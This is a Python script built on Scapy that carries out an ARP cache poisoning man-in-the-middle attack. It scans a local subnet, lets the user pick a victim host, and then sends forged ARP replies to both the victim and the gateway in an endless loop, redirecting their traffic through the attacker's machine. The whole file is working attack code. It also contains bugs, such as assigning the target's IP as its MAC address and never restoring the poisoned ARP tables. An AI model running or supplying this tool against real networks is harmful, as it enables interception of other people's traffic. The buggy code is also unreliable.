from scapy.all import *
import time
import argparse

# Scan the local network for targets
def scan_network(network):
    print(f"Scanning network: {network}")
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    clients = {}
    for sent, received in answered_list:
        clients[received.psrc] = received.hwsrc
    
    return clients

# poison the target's ARP cache to redirect traffic to the attacker's machine
def poison_arp_cache_for_target(target_ip, target_mac, gateway_ip, attacker_mac, interface):
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=attacker_mac)
    frame = Ether(dst=target_mac) / arp_response
    # send at layer 2
    sendp(frame, verbose=False, iface=interface)

def poison_arp_cache_for_gateway(gateway_ip, gateway_mac, target_ip, attacker_mac, interface):
    arp_response = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=attacker_mac)
    frame = Ether(dst=gateway_mac) / arp_response
    # send at layer 2
    sendp(frame, verbose=False, iface=interface)

def pickTarget(subnet):
    try:
        clients = scan_network(subnet)

        for i, key in enumerate(clients.keys()):
            print(f"{i+1}): {key} MAC: {clients[key]}")

        choice = int(input("Select a target client (1, 2, 3, etch.): "))
        # check if the user input is within the range of the clients found
        if 1 <= choice <= len(clients):
            return list(clients.items())[choice - 1]  # return the selected client's IP and MAC
    except (ValueError, IndexError):
        print("Invalid choice. Please select a valid client.")
    return None

def get_gateway_mac(gateway_ip, interface):

    if not gateway_ip or gateway_ip == "0.0.0.0":
         return "Error: Could not determine gateway IP."
    
    print(f"Gateway IP found: {gateway_ip}")

    #Create an ARP request to ask who has the gateway IP
    arp_request = ARP(pdst=gateway_ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    # Send the packet and capture the response
    # srp() sends and receives packets at layer 2
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
    
    # Extract the MAC address from the first response
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return "Error: No ARP response received."

# main function
if __name__ == "__main__":
    #passing network subnet through argparse
    parser = argparse.ArgumentParser(description="Arp poisoning attack on both the router and the target")
    parser.add_argument("-i", "--interface", required=True, help="Network Interface to send DHCP packets")
    parser.add_argument("-n", "--network", required=True, help="Target network Pool in CIDR notation (e.g., 192.168.1.0/24)")
    args = parser.parse_args()
    
    target = pickTarget(args.network)
    target_ip = target[0]
    target_mac = target[0]
    gateway_ip = conf.route.route("0.0.0.0")[2]
    gateway_mac = get_gateway_mac(gateway_ip, args.interface)
    attacker_mac = get_if_hwaddr(conf.iface)

    print(f"Poisoning target ip {target_ip} and the gateway ip {gateway_ip}....")
    try:
        while True:
            print("!" ,end='', flush=True)
            poison_arp_cache_for_target(target_ip, target_mac, gateway_ip, attacker_mac, args.interface)
            poison_arp_cache_for_gateway(gateway_ip, gateway_mac, target_ip, attacker_mac, args.interface)
            time.sleep(1)
    except KeyboardInterrupt:
        print("ARP poisoning stopped by user")


